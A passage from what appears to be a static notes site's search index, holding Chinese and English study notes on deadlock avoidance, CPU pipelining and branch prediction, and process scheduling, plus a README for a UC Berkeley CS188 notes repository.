\u8d44\u6e90\u8db3\u591f\u6267\u884c P1\uff0cP1 \u91ca\u653e\u540e\u53ef\u4ee5\u6267\u884c P0 -&gt; P2</li> </ul> <p></p> <ul> <li>\u4e0a\u56fe\u4e0b\u534a\u90e8\u5206\u7684\u60c5\u51b5\u662f unsafe \u7684\uff0c\u56e0\u4e3a\u6267\u884c P1 \u540e\u4e0d\u8db3\u4ee5\u6267\u884c P0\u3002</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#bankers-algorithm","title":"Banker's algorithm","text":"<ul> <li>Single instance of each resource type \u27a0 use resource-allocation graph (if cycle)</li> <li> <p>Multiple instances of a resource type \u27a0 use the banker\u2019s algorithm</p> </li> <li> <p>Banker\u2019s algorithm is for multiple-instance resource deadlock avoidance</p> <ul> <li>Each process must claim maximum use of each resource type in advance</li> <li>When a process requests a resource it may have to wait</li> <li>When a process gets all its resources it must release them in a finite amount of time</li> </ul> </li> <li> <p>n processes, m types of resources</p> <ul> <li>available: an array of length m, instances of available resource<ul> <li>available[j] = k: k instances of resource type Rj available</li> </ul> </li> <li>max: <code>n*m</code> matrix<ul> <li>max [i,j] = k: process Pi may request at most k instances of resource Rj</li> </ul> </li> <li>allocation: <code>n*m</code> matrix <ul> <li>allocation[i,j] = k: Pi is currently allocated k instances of Rj</li> </ul> </li> <li>need: <code>n*m</code> matrix<ul> <li>need[i,j] = k: Pi may need k more instances of Rj to complete its task</li> <li>need [i,j] = max[i,j] \u2013 allocation [i,j]</li> </ul> </li> </ul> </li> </ul> <p>Example</p> <p>\u9898\u76ee\u672c\u8eab\u53ea\u4f1a\u7ed9\u6211\u4eec system state \u548c allocation, max \u5411\u91cf/\u77e9\u9635\u3002 </p> <p></p> <p>\u6211\u4eec\u9700\u8981\u505a\u7684\u4e5f\u5f88\u7b80\u5355\uff1a</p> <ol> <li>\u8ba1\u7b97 need \u77e9\u9635\u548c available \u5411\u91cf\u3002</li> <li>\u89c2\u5bdf available \u5411\u91cf\u80fd\u5426\u6ee1\u8db3\u67d0\u4e00\u4e2a\u8fdb\u7a0b Pi \u5bf9\u5e94\u7684 need \u5411\u91cf\uff08\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0cP3 \u53ef\u4ee5\u90fd\u6ee1\u8db3\uff09\uff0c\u6267\u884c\u4e0b\u4e00\u6b65\uff1b\u5982\u679c\u90fd\u4e0d\u80fd\uff0c\u5219\u5904\u4e8e unsafe state\uff0c\u7ed3\u675f\u3002</li> <li>\u5c06 Pi \u7684 allocation \u5411\u91cf\u52a0\u5230 available \u4e0a\uff0c\u5e76\u5c06\u5176\u6392\u9664\u51fa\u77e9\u9635\uff1b\u518d\u6b21\u6267\u884c\u6b65\u9aa4 2\uff0c\u76f4\u5230 need \u4e3a\u7a7a\u3002</li> </ol> <p>https://www.cs.cornell.edu/courses/cs414/2007sp/homework/hw2_soln.pdf </p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock-detection","title":"Deadlock detection","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#single-instance-resources-wait-for-graph","title":"Single Instance Resources (Wait-for Graph)","text":"<p>find a cycle:</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#multi-instance-resources","title":"Multi-instance Resources","text":"<p>Just like Banker's algorithm.</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock-recovery","title":"Deadlock recovery","text":"<ul> <li>Terminate deadlocked processes. options:<ul> <li>Abort all deadlocked processes</li> <li>Abort one process at a time until the deadlock cycle is eliminated</li> </ul> </li> <li>Resource preemption<ul> <li>Select a victim</li> <li>Rollback</li> <li>Starvation</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/PBFX/","title":"PBFX","text":"","tags":["notes"]},{"location":"note/CSys-II/PBFX/#instruction-set-architecture","title":"Instruction Set Architecture","text":"","tags":["notes"]},{"location":"note/CSys-II/PBFX/#byte-addressing","title":"\u5b57\u8282\u5bfb\u5740\uff08byte addressing\uff09","text":"<ul> <li>8bits - byte</li> <li>16bits - half word</li> <li>32bits - word</li> <li>64bits - double word</li> </ul> <p>\u63a9\u7801\u673a\u5236\uff08mask\uff09</p> <p></p> <p>\u53ea\u6709\u63a9\u7801\u4f4d\u4e3a 1 \u65f6\uff0c\u6211\u4eec\u624d\u8bfb/\u5199\u5185\u5b58\uff0c\u5426\u5219\u4e0d\u4fee\u6539\u3002</p> <p>Question</p> <p>\u4e3a\u4ec0\u4e48\u6211\u4eec\u4f7f\u7528\u5c0f\u7aef\u683c\u5f0f\uff0c\u5373\u4f4e\u4f4d\u653e\u5728\u4f4e\u5730\u5740\uff1f</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#_1","title":"\u63a7\u5236\u6d41\u5bfb\u5740","text":"","tags":["notes"]},{"location":"note/CSys-II/PBFX/#cpu-calculation","title":"CPU Calculation","text":"<ul> <li>Clock time\uff1a\\(T_c\\) \u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u957f\u5ea6\uff0c\u4e5f\u53eb \\(\\Delta t_0\\quad or\\quad t_{0}\\) </li> <li>Execution Time\uff1am \u7ea7\u6d41\u6c34\u7ebfCPU \u6267\u884c n \u6761\u6307\u4ee4\u7684\u603b\u65f6\u95f4 T\uff0cT=(n+m\u22121) \\(t_0\\)</li> <li>Troughput\uff1a\u541e\u5410\u91cf TP\uff0c\\(TP=\\frac nT=\\frac n{n+m-1}\\:\\frac1{\\Delta t_0}\\)</li> <li>Speedup\uff1a\u52a0\u901f\u6bd4 Sp\uff0c\\(\\begin{aligned}\\text{Sp}&amp;=\\frac{ExecutionTime_{no-pipeline}}{ExecutionTime_{pipeline}}=\\frac{nm\\quad t_0}{(n+m-1)\\quad t_0}\\end{aligned}\\)</li> <li>efficiency\uff1a\u6548\u7387 \\(\\eta\\)\uff0c\\(\\eta=\\frac{Sp}m\\)</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#_2","title":"\u8003\u70b9\u4e00","text":"<p>\u6d41\u6c34\u7ebf CPU \u964d\u4f4e\u4e86\u6bcf\u4e00\u6761\u6307\u4ee4\u7684\u6267\u884c\u65f6\u95f4\uff1f </p> <p>No, Does Not improve latency for individual instruction.</p> <p>Another expression: Pipeline reduce individual execution time? Improving of Throughput. Correct</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#_3","title":"\u8003\u70b9\u4e8c","text":"<p>\u6d41\u6c34\u7ebf CPU \u964d\u4f4e\u8d44\u6e90/\u90e8\u4ef6\u7684\u6d88\u8017\uff1f</p> <p>No\uff0cbring overhead for registers</p> <p>Improving of efficiency for resources (functional unit) . Correct</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#_4","title":"\u8003\u70b9\u4e09","text":"<p>\u6ce8\u610f\u5230 \\(\\\\lim_{ n \\to \\infty } Sp = m\\) \uff0c\u90a3\u4e48\u662f\u4e0d\u662f m\uff08\u5373\u6d41\u6c34\u7ebf\u7ea7\u6570\uff09\u8d8a\u5927\u8d8a\u597d\uff1f</p> <p>No, overhead may be huge.</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#example","title":"Example","text":"<p>\u663e\u7136\u6211\u4eec\u9700\u8981\u8ba1\u7b97 \\(a_{1}b_{1}+a_{2}b_{2}+a_{3}b_{3}+a_{4}b_{4}\\) \uff0c\u5171\u56db\u6b21\u4e58\u6cd5\u4e09\u6b21\u52a0\u6cd5\uff0c\u4f5c\u51fa\u65f6\u7a7a\u56fe\uff1a</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#pipeline-hazard","title":"Pipeline hazard","text":"","tags":["notes"]},{"location":"note/CSys-II/PBFX/#data-hazard","title":"data hazard","text":"","tags":["notes"]},{"location":"note/CSys-II/PBFX/#forwarding","title":"forwarding","text":"<p>\u4e0b\u56fe\u4e2d\u84dd\u8272\u7ebf\u8868\u793a\u5bf9 x2 \u7684\u9700\u6c42\uff0c\u76f4\u7ebf\u6307\u5411\u5de6\u4e0b\u5c31\u8868\u660e\u4e86\u8fd9\u4e2a\u5730\u65b9\u51fa\u73b0\u4e86\u6570\u636e\u51b2\u7a81\uff1a</p> <p></p> <p>\u5728\u7406\u8bba\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 double bubble \u7684\u65b9\u5f0f\u63d2\u5165\u4e24\u6761 nop \u6307\u4ee4\uff0c\u5e76\u901a\u8fc7\u4e0a\u5347\u6cbf\u5199\u5165\u3001\u4e0b\u964d\u6cbf\u8f93\u51fa\u7684\u65b9\u5f0f\u89e3\u51b3\uff1b\u5f53\u7136\uff0c\u4e3a\u4e86\u9ad8\u6548\uff0c\u6211\u4eec\u9700\u8981 forwarding \u3002</p> <p>\u5728\u7406\u8bba\u8bfe\u4e0a\uff0c\u6211\u4eec\u7684 forwarding \u56fe\u5982\u4e0b\u6240\u793a\uff08\u4e0e\u5b9e\u9a8c\u8bfe\u6709\u6240\u4e0d\u540c\uff09\uff1a</p> <p></p> <p>\u5728\u4e0a\u56fe\u4e2d\uff0c\u6211\u4eec\u524d\u9012\u7684\u5185\u5bb9\u4e3a MEM \u548c WB \u9636\u6bb5\u7684 alu_res \u6216\u8005\u662f\u8bbf\u5b58\u7ed3\u679c\uff0c\u524d\u9012\u5230 EXE \u9636\u6bb5\uff1b\u540c\u65f6\u6ce8\u610f\u6211\u4eec</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#stall","title":"stall","text":"<p>\u4e00\u822c\u51fa\u73b0\u5728 load-use \u7684\u60c5\u51b5\u4e0b\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#control-hazards","title":"control hazards","text":"<p>\u8003\u8bd5\u9ed8\u8ba4\u6846\u67b6\uff1a</p> <p></p> <p>\u5982\u679c\u662f\u5728 ID \u9636\u6bb5\u7ed9\u51fa\u6bd4\u5bf9\u7ed3\u679c\uff0c\u628a compare \u653e\u5728 ID \u9636\u6bb5\uff0c\u90a3\u4e48\u6d6a\u8d39\u7684\u65f6\u949f\u5468\u671f\u5c06\u4f1a\u51cf\u5c11\u5230\u4e00\u4e2a\uff1b\u4f46\u662f\u5c06\u4f1a\u9700\u8981\u589e\u52a0\u4e00\u4e2a ALU\uff0c\u8ba1\u7b97\u8df3\u8f6c\u5730\u5740\u3002\uff08\u7a7a\u95f4\u6362\u65f6\u95f4\uff09</p> <p>\u80fd\u5426\u4f7f\u5f97\u65f6\u949f\u5468\u671f\u6d6a\u8d39\u7684\u66f4\u5c11\uff1f</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#branch-prediction","title":"Branch prediction","text":"<ol> <li>\u56fa\u5b9a\u7684\u9884\u6d4b\uff0c\u5373\u9884\u6d4b<ul> <li>\u4e00\u5b9a\u8df3\u8f6c</li> <li>\u4e00\u5b9a\u4e0d\u8df3\u8f6c</li> </ul> </li> <li>\u9884\u6d4b\u4e00\u4e9b\u5206\u652f<ul> <li>\u8df3\u5f80\u4f4e\u5730\u5740\u66f4\u53ef\u80fd\u662f\u5728 for \u5faa\u73af\u4e2d\uff0c\u66f4\u53ef\u80fd\u9700\u8981\u8df3\u8f6c\u3002</li> </ul> </li> <li>\u5206\u652f\u5ef6\u8fdf\u69fd<ul> <li>\u5c06\u4e0e\u5206\u652f\u5b8c\u5168\u65e0\u5173\u7684\u6307\u4ee4\u653e\u7f6e\u5728\u5206\u652f\u6307\u4ee4\u540e\u9762\uff0c\u5145\u5206\u5229\u7528\u5206\u652f\u5e26\u6765\u7684\u5ef6\u8fdf\u3002</li> </ul> </li> <li>\u52a8\u6001\u5206\u652f\u9884\u6d4b<ul> <li>\u7528\u4e00\u5f20\u8868 (Branch history table, BHT) \u8bb0\u5f55\u662f\u5426\u8df3\u8f6c\uff1b\u5982\u679c\u8868\u4e2d\u5b58\u5728\u76f8\u540c\u7684\u5730\u5740\uff0c\u5219\u5927\u6982\u7387\u4f1a\u548c\u4e0a\u4e00\u6b21\u6267\u884c\u8be5\u5730\u5740\u6307\u4ee4\u4e00\u6837\u7684\u8df3\u8f6c\u4e0e\u5426\u3002</li> <li>\u5728\u8868\u4e2d\uff0c\u6211\u4eec\u7528\u4e00\u4e2a\u6bd4\u7279\u6765\u8bb0\u5f55\u67d0\u4e00\u5730\u5740\u6307\u4ee4\u4e0a\u4e00\u6b21\u6267\u884c\u662f\u5426\u8df3\u8f6c</li> </ul> </li> </ol> <p>Question</p> <p>\u4e00\u6bd4\u7279\u52a8\u6001\u9884\u6d4b\u5668\u7f3a\u70b9\uff1a</p> <pre><code>for (int i = 0; i &lt; 10; i++) {\n    for (int j = 0; j &lt; 10; j++){\n    }\n }\n</code></pre> <p>\u4e00\u5171\u4f1a\u53d1\u751f\u591a\u5c11\u6b21\u5206\u652f\u9884\u6d4b\u9519\u8bef\uff1f\uff08\u5047\u8bbe\u5176\u5b9e\u72b6\u6001\u4e0b BHT \u4e3a\u7a7a\uff09</p> <p>\u5f88\u5bb9\u6613\u51fa\u73b0 10+1 = 11 \u7684\u7b54\u6848\uff1b\u56e0\u4e3a\u7b2c\u4e00\u6b21\u5728\u8ba4\u4e3a\u7b2c\u4e00\u6b21\u5728 <code>j&lt;10</code> \u51fa\u4e0d\u9884\u6d4b\uff0c\u63a5\u4e0b\u6765 10 \u6b21\u56e0\u4e3a <code>j=10</code> \u800c\u9884\u6d4b\u5931\u8d25\uff0c\u6700\u540e\u5728\u5916\u5c42\u5faa\u73af\u9884\u6d4b\u5931\u8d25 1 \u6b21\u3002</p> <p>\u4f46\u662f\u9700\u8981\u6ce8\u610f\uff0c\u5728 <code>j=10</code> \u9884\u6d4b\u5931\u8d25\u65f6\uff0c\u5c06 BHT \u4e2d\u8be5\u5730\u5740\u8bbe\u7f6e\u4e3a 0\uff08\u5047\u8bbe 1 \u8868\u793a\u8df3\u8f6c\uff09\uff1b\u800c\u4e0b\u4e00\u6b21\u7531\u4e8e\u5916\u5c42\u5faa\u73af\u518d\u6b21\u5230\u8fbe\u6b64\u5904\u65f6\uff0c<code>j=0</code> \u800c\u9884\u6d4b\u4e0d\u8df3\u8f6c\uff0c\u53c8\u4e00\u6b21\u5931\u8d25\uff1b\u8fd9\u6837\u7684\u64cd\u4f5c\u53c8\u6709 9 \u6b21\uff1b\u6240\u4ee5\u4e00\u5171\u53d1\u751f 20 \u6b21\u5206\u652f\u9884\u6d4b\u9519\u8bef\u3002</p> <p>Question</p> <p>\u90a3\u5982\u679c\u6211\u4eec\u7528\u4e00\u4e2a\u4e24\u6bd4\u7279\u7684\u5206\u652f\u9884\u6d4b\u5668\u5462\uff1f </p> <p>\u6b64\u65f6\u6267\u884c\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u4e00\u5171\u4f1a\u53d1\u751f\u591a\u5c11\u6b21\u5206\u652f\u9884\u6d4b\u9519\u8bef\uff1f</p> <pre><code>for (int i = 0; i &lt; 10; i++) {\n    for (int j = 0; j &lt; 10; j++){\n    }\n }\n</code></pre> <p>\u663e\u7136\uff0c\u73b0\u5728\u5e94\u8be5\u662f\u6211\u4eec\u4e4b\u524d\u5206\u6790\u7684\u201c\u9519\u8bef\u7b54\u6848\u201d\uff0c\u5373 11 \u6b21\u3002</p> <p>\u65e2\u7136\u6211\u4eec\u90fd\u628a\u67d0\u4e2a\u5730\u5740\u7684\u8df3\u8f6c\u6307\u4ee4\u662f\u5426\u8df3\u8f6c\u8bb0\u5f55\u4e0b\u6765\u4e86\uff0c\u628a\u5b83\u8df3\u8f6c\u7684\u6307\u4ee4\u4e00\u540c\u8bb0\u4e0b\u6765\u5c82\u4e0d\u662f\u66f4\u52a0\u7701\u65f6\u95f4\uff1f</p> <p></p> <p>BTB \u7684\u5b9e\u9645\u6548\u679c\uff1a</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#linear-and-nonlinear-pipeline","title":"Linear and nonlinear pipeline","text":"<p>\u6211\u4eec\u6240\u5b9e\u73b0\u7684\u4e94\u7ea7\u6d41\u6c34\u7ebf\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u7ebf\u6027\u6d41\u6c34\u7ebf\uff1b\u4f46\u662f\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u4f7f\u7528\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\uff0c\u53cd\u590d\u7528\u5230\u67d0\u4e00\u6d41\u6c34\u6bb5\u751a\u81f3\u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u6d41\u6c34\u6bb5\uff1b</p> <p></p> <p>\u6211\u4eec\u4e0d\u53ef\u80fd\u7b49\u5230\u4e00\u6761\u6307\u4ee4\u6267\u884c\u5b8c\u6bd5\u624d\u9001\u5165\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u90a3\u6837\u7b49\u540c\u4e8e\u591a\u5468\u671f CPU\uff1b\u4f46\u662f\u53c8\u8981\u907f\u514d\u524d\u540e\u4e24\u6761\u6307\u4ee4\u540c\u65f6\u9700\u8981\u4f7f\u7528\u540c\u4e00\u6bb5\u6d41\u6c34\u6bb5\u7684\u7ade\u4e89\u60c5\u51b5\uff1b</p> <p>\u4e8e\u662f\u5f15\u5165 \u4e8c\u7ef4\u9884\u7ea6\u8868\uff08\u5373\u8bb0\u5f55\u4e86\u67d0\u6761\u6307\u4ee4\u5728\u5f00\u59cb\u6267\u884c\u7684\u82e5\u5e72\u4e2a\u5468\u671f\u5185\u5bf9\u4e0d\u540c\u6d41\u6c34\u6bb5\u7684\u5360\u7528\u60c5\u51b5\uff09\uff1b</p> <p>\u4e00\u6761\u6307\u4ee4\u5bf9\u540c\u4e00\u6d41\u6c34\u6bb5\u7684\u4f7f\u7528\u7684\u5468\u671f\u95f4\u9694\u6784\u6210\u4e86\u5ef6\u8fdf\u7981\u6b62\u8868(ForbiddenList) \u5373\u8868\u793a\u9694\u591a\u957f\u65f6\u95f4\u4e0d\u80fd\u591f\u9001\u5165\u6307\u4ee4\uff1b</p> <p>\u4e3a\u4e86\u65b9\u6807\uff0c\u5f15\u5165 \u51b2\u7a81\u5411\u91cf(CollisonVector) \u52a9\u8bb0\uff0c\u5373\u5ef6\u8fdf\u7981\u6b62\u8868\u4e2d\u7684\u5bf9\u5e94\u4f4d\u7f6e\u4e8c\u8fdb\u5236\u4e3a 1\uff1a</p> <p>\u5982\u4e0b\u56fe\uff0c\u5ef6\u8fdf\u7981\u6b62\u8868\uff1aF={1\uff0c5\uff0c6\uff0c8}\uff0c\u51b2\u7a81\u5411\u91cf C=(10110001)\u3002</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u5f15\u5165\u51b2\u7a81\u5411\u91cf\u53ea\u662f\u7b80\u5355\u7b80\u5316\u8868\u793a\u5417\uff1f\u8003\u8651\uff1a\u4e0a\u8ff0\u5ef6\u8fdf\u7981\u6b62\u8868\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u5728\u7b2c 2 \u62cd\u7684\u65f6\u5019\u9001\u5165\u65b0\u7684\u6307\u4ee4\uff1b\u90a3\u4e48\u6b64\u65f6\u5bf9\u6d41\u6c34\u6bb5\u7684\u5360\u7528\u8be5\u5982\u4f55\u8868\u793a\uff1f\u4e09\u7ef4\u9884\u7ea6\u8868\uff0c\u7136\u540e\u518d\u627e\u7b2c 3 \u62cd\u53ef\u80fd\u7684\u9001\u5165\u65f6\u95f4\uff1f\u53ef\u60f3\u6709\u591a\u9ebb\u70e6\u3002\u4f46\u662f\u6211\u4eec\u60ca\u5947\u5730\u53d1\u73b0\uff0c\u524d\u540e\u4e24\u6761\u6307\u4ee4\u7684\u51b2\u7a81\u5411\u91cf\u9519\u4f4d\u76f8\u6216\u540e\u7684\u7ed3\u679c\u6b63\u662f\u4e24\u6761\u6307\u4ee4\u90fd\u5728\u6d41\u6c34\u7ebf\u4e0a\u65f6\u7684\u7b49\u6548\u51b2\u7a81\u5411\u91cf\uff0c\u5982\u4e0b\uff1a</p> <p></p> <p>\u5f53\u7136\u6211\u4eec\u8fd8\u6709\u5176\u4ed6\u8c03\u5ea6\u7684\u53ef\u80fd\uff0c\u5e76\u80fd\u591f\u5206\u522b\u7ed8\u5236 \u72b6\u6001\u8f6c\u79fb\u56fe\uff1a</p> <p></p> <p>\u5c1d\u8bd5\u6240\u6709\u53ef\u80fd\u7684\u8c03\u5ea6\u65b9\u5f0f\uff0c\u627e\u51fa\u6700\u5c0f\u5e73\u5747\u95f4\u9694\uff1a</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#_5","title":"\u8fdb\u7a0b","text":"","tags":["notes"]},{"location":"note/CSys-II/PBFX/#process-control-block-pcb","title":"\u8fdb\u7a0b\u63a7\u5236\u5757 Process Control Block (PCB)","text":"<p>\u2461\uff0c\u8bb0\u5f55\u4e86\u4e00\u4e2a\u8fdb\u7a0b\u7684 PID\uff1b\u6bcf\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5c31\u4f1a\u88ab\u5206\u914d\u4e00\u4e2a\u72ec\u7acb\u7684 PCB \u548c PID \u3002</p> <p>\u2462\uff0c\u8bb0\u5f55\u4e86\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4fe1\u606f\uff1bPC / \u901a\u7528\u5bc4\u5b58\u5668\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/PBFX/#_6","title":"\u4e0a\u4e0b\u6587\u5207\u6362/\u8c03\u5ea6","text":"<p>Round Robin \u8f6e\u8be2\u4f8b\u9898\uff1a</p> <p>\u5047\u8bbetime quantum \u4e3a 20 \u4e2a\u5355\u4f4d\uff0c\u800c\u4e0a\u4e0b\u6587\u5207\u6362\u5f00\u9500\u4e3a 10 \u4e2a\u5355\u4f4d\u65f6\u95f4\uff0c\u90a3\u4e48 CPU \u5229\u7528\u7387\u662f\u591a\u5c11\uff1f</p> Process Brust Time P1 53 P2 17 P3 68 P4 24 <p>\u7ed8\u5236 Gantt chart \u5982\u4e0b\uff1a</p> <p></p> <p>\u540c\u65f6\u6ce8\u610f\u5230\u5207\u6362\u4e86 9 \u6b21\uff0c\u6240\u4ee5\u6548\u7387\u4e3a</p> <p>\\(\\eta = \\frac{162}{162+9*10}*100\\%\\)</p>","tags":["notes"]},{"location":"note/cs188/","title":"cs188 - sp24","text":"<p>\u4e2d\u6587 | English</p>","tags":["notes","cs188"]},{"location":"note/cs188/#_1","title":"\u4ecb\u7ecd","text":"<p>\u8fd9\u4e2a\u4ed3\u5e93\u5b58\u653e\u7684\u662f UCB CS 188 Spring 2024 \u7684\u7b14\u8bb0&amp;\u81ea\u5b66\u8d44\u6599\uff1b\u7406\u8bba\u4e0a\uff0c\u4f60\u5b66\u4e60\u8be5\u8bfe\u7a0b\u6240\u9700\u8981\u7684\u5168\u90e8\u8d44\u6599\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u53ca\u7ed9\u51fa\u7684\u5916\u94fe\u4e2d\u627e\u5230\u3002</p> <ul> <li>\u7b14\u8bb0\uff1a\u4e3b\u4f53\u4e3a\u539f\u8bfe\u7a0b notes<sup>1</sup>\uff0c\u52a0\u5165\u4e86\u81ea\u5df1\u7684\u601d\u8003\u548c\u6392\u7248\uff0c\u5728\u6211\u7684\u535a\u5ba2\u4e0a\u4f60\u53ef\u4ee5\u9605\u8bfb\u8fd9\u4e9b\u7b14\u8bb0\uff1b\u4f46\u4e3a\u4e86\u66f4\u597d\u7684\u89c2\u611f\uff0c\u5efa\u8bae\u4f7f\u7528 obsidian \u67e5\u770b\uff0c\u89c1\u4f7f\u7528-\u9605\u8bfb\u3002</li> <li>\u81ea\u5b66\u8d44\u6599\uff1a\u7531\u4e8e UCB \u8fd1\u5e74\u7684\u90e8\u5206\u8bfe\u7a0b\u5f00\u59cb\u9700\u8981 CalNet Authentication Service\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u4e4b\u540e\u7684\u5b66\u4e60\uff0c\u5c06\u6211\u8ba4\u4e3a\u81ea\u5b66\u9700\u8981\u7684\u8d44\u6599\u5b58\u6863\u4e8e\u672c\u4ed3\u5e93\uff1b\u7531\u4e8e\u4e0d\u6e05\u695a\u5982\u4f55\u7533\u8bf7\u8f6c\u8f7d\u6743\u9650\uff0c\u6545\u82e5\u672c\u9879\u76ee\u5bf9\u539f\u8bfe\u7a0b\u53ca\u5176\u76f8\u5173\u9879\u76ee\u4ea7\u751f\u4e0d\u826f\u5f71\u54cd\uff0c\u8bf7\u8054\u7cfb\u6211 \u5220\u9664\u3002</li> <li>\u5982\u679c\u5bf9\u641c\u7d22\u7b97\u6cd5\u4e86\u7136\u4e8e\u5fc3\u3001\u5bf9 ML/DL/RL \u77e5\u8bc6\u8f83\u4e3a\u719f\u6089\u4e14\u5e0c\u671b\u63a5\u89e6\u4e00\u4e9b\u5c0f\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u5927\u53ef\u76f4\u63a5\u505a project\u3002</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/#_2","title":"\u76ee\u5f55","text":"","tags":["notes","cs188"]},{"location":"note/cs188/#noteproject","title":"note&amp;project","text":"Intro          <ul> <li> 01-Intro_to_AI_Rational_Agents  364  1 mins              1739624158 </li> <li> project-0  52  39  1 mins              1739624158 </li> </ul> Search          <ul> <li> project-1  714  244  5 mins              1739718485 </li> <li> 02-State_Spaces_Uninformed_Search  1654  19  6 mins              1739624158 </li> <li> 03-Informed_Search_Astar_and_Heuristics  1499  16  5 mins              1739624158 </li> <li> 04-Local_Search  745  39  3 mins              1739624158 </li> </ul> Multi-Agent Search          <ul> <li> 06-Expectimax_Monte_Carlo_Tree_Search  1409  5 mins              1740028248 </li> <li> 05-Trees_Minimax_Pruning  1944  6 mins              1739674879 </li> <li> project-2  983  360  8 mins              1739624158 </li> </ul> Logic and Classical Planning          <ul> <li> 07-Propositional_Logic_and_Planning  281  1 mins              1739624158 </li> <li> 08-DPLL&amp;ForwardChaining  1699  49  6 mins              1739624158 </li> <li> 09-First_Order_Logic  788  3 mins              1739624158 </li> <li> project-3  605  2 mins              1739624158 </li> </ul> Ghostbusters          <ul> <li> 10-Intro_to_Probability  350  1 mins              1739624158 </li> <li> 11-Bayesian_Network_Intro  173  1 mins              1739624158 </li> <li> 12-Variable_Elimination  43  23  0 mins              1739624158 </li> <li> 13-Approximate_Inference  440  97  3 mins              1739624158 </li> <li> 14-Markov_Models  407  1 mins              1739624158 </li> <li> 15-Hidden_Marko_Models  820  3 mins              1739624158 </li> <li> 16-PF-DN-VPI  870  3 mins              1739624158 </li> <li> 17-Markov_Decision_Processes  503  2 mins              1739624158 </li> <li> project-4  1162  255  7 mins              1739624158 </li> </ul> Machine/Reinforcement Learning          <ul> <li> project5/6 \u65e0\u8bb2\u89e3\uff08project 6 - Q7 \u4ee3\u7801\u5df2\u5b8c\u6210\uff0c\u4f46\u662f\u8bad\u7ec3\u7ed3\u679c\u5f88\u5dee\uff0c\u65e0\u5904\u8c03\u8bd5\uff0c\u9042\u653e\u5f03\uff09\u3002  22906  1143  91 mins              1740028248 </li> <li> 18-Iteration  392  1 mins              1739624158 </li> <li> 19-Navie_Bayes  1529  5 mins              1739624158 </li> <li> 20-Perceptron  437  1 mins              1739624158 </li> <li> 21-Regression  862  3 mins              1739624158 </li> <li> 22-Neural_Networks  616  2 mins              1739624158 </li> <li> 24-Reinforcement_Learnin  254  1 mins              1739624158 </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/#materials","title":"materials","text":"<ul> <li>course_page<ul> <li>\u8bfe\u7a0b\u7f51\u7ad9\u7684 calendar\uff0c\u4fbf\u4e8e\u67e5\u770b\u5982\u4f55\u81ea\u5b66\uff1b</li> </ul> </li> <li>disc<ul> <li>\u76f8\u5173\u8ba8\u8bba\u9898\u53ca\u5176\u9898\u89e3\uff1b</li> </ul> </li> <li>origianl_note<ul> <li>\u8bfe\u7a0b\u539f\u7b14\u8bb0\uff0c\u7406\u8bba\u4e0a\u67e5\u770b\u4e0a\u8ff0\u672c\u4eba note \u8db3\u77e3\uff1b</li> </ul> </li> <li>project<ul> <li>original_zip<ul> <li>\u539f project \u6e90\u7801\uff1b</li> </ul> </li> <li>intro_page<ul> <li>\u4fdd\u7559\u7684\u5b9e\u9a8c\u6587\u6863\u7684\u9875\u9762\u6587\u4ef6\u3002</li> </ul> </li> <li>solution<ul> <li>\u53c2\u8003\u4ee3\u7801\uff08\u79fb\u52a8\u81f3 <code>cs188/project/solution/</code> \u4e2d\uff09</li> </ul> </li> </ul> </li> <li>gradecode<ul> <li>4VK322\u3002</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/#_3","title":"\u4f7f\u7528","text":"","tags":["notes","cs188"]},{"location":"note/cs188/#_4","title":"\u4e0b\u8f7d","text":"","tags":["notes","cs188"]},{"location":"note/cs188/#git","title":"\u4f7f\u7528 git","text":"<pre><code>git clone https://github.com/Darstib/cs188.git\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/#_5","title":"\u76f4\u63a5\u5168\u90e8\u4e0b\u8f7d","text":"","tags":["notes","cs188"]},{"location":"note/cs188/#_6","title":"\u90e8\u5206\u4e0b\u8f7d","text":"<p>\u5982\u679c\u53ea\u662f\u60f3\u8981 note \u6216\u8005 project \u90e8\u5206\u6216\u8005\u5176\u4ed6\u5355\u72ec\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u4f7f\u7528 DownGit\uff0c\u8f93\u5165\u76ee\u6807\u6587\u4ef6\u5939\u5728\u6b64 git \u4ed3\u5e93\u7684 url 